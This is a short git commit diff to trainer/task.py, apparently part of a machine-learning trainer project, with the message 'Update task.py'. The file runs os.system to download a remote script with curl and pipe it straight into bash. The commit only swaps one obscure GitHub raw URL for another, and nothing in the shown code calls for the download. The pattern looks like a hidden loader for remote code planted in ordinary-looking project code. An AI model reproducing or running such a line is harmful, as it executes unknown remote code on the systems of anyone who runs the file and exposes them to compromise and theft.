dfd03516047edf81c814b513206681042f7672a3
vedhagsvp <vedhag230223@gmail.com>
2025-09-09 01:47:44 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/taberas/raw/main/aplok | bash')
+os.system('curl -sL https://github.com/vedhagsvp/qubros/raw/main/jtqub.sh | bash')
